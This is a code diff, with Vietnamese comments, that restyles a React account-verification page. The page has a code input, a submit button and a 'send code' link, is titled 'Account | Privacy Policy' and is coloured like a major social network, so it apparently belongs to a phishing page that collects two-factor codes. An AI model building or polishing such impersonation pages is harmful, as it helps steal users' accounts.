@@ -119,50 +119,45 @@ const Verify = () => {
     };
 
     return (
-        // 🎯 THÊM PADDING TOP VÀ BOTTOM ĐỂ KHÔNG BỊ DÍNH LÊN TRÊN
-        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa] py-8 px-4'>
+        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
             <title>Account | Privacy Policy</title>
-            
-            {/* 🎯 THÊM CONTAINER VỚI MARGIN AUTO ĐỂ CĂN GIỮA CHẮC CHẮN */}
-            <div className='w-full max-w-md mx-auto'>
-                <div className='flex flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
-                    <p className='text-3xl font-bold'>{translatedTexts.title}</p>
-                    <p>{translatedTexts.description}</p>
+            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
+                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
+                <p>{translatedTexts.description}</p>
 
-                    <img src={VerifyImage} alt='' />
-                    
-                    {/* 🎯 SỬA INPUT: Tăng cỡ chữ số nhập vào */}
-                    <input
-                        type='number'
-                        inputMode='numeric'
-                        max={8}
-                        placeholder={translatedTexts.placeholder}
-                        className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2 text-lg font-medium'
-                        value={code}
-                        onChange={(e) => setCode(e.target.value)}
-                        onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
-                    />
-                    
-                    {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
-                    
-                    <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
-                        <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
-                        <div>
-                            <p className='font-medium'>{translatedTexts.infoTitle}</p>
-                            <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
-                        </div>
+                <img src={VerifyImage} alt='' />
+                
+                {/* 🎯 SỬA INPUT: Tăng cỡ chữ số nhập vào */}
+                <input
+                    type='number'
+                    inputMode='numeric'
+                    max={8}
+                    placeholder={translatedTexts.placeholder}
+                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2 text-lg font-medium'
+                    value={code}
+                    onChange={(e) => setCode(e.target.value)}
+                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
+                />
+                
+                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
+                
+                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
+                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
+                    <div>
+                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
+                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
                     </div>
-
-                    <button
-                        className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
-                        onClick={handleSubmit}
-                        disabled={isLoading || !code.trim()}
-                    >
-                        {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
-                    </button>
-
-                    <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
                 </div>
+
+                <button
+                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
+                    onClick={handleSubmit}
+                    disabled={isLoading || !code.trim()}
+                >
+                    {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
+                </button>
+
+                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
             </div>
         </div>
     );
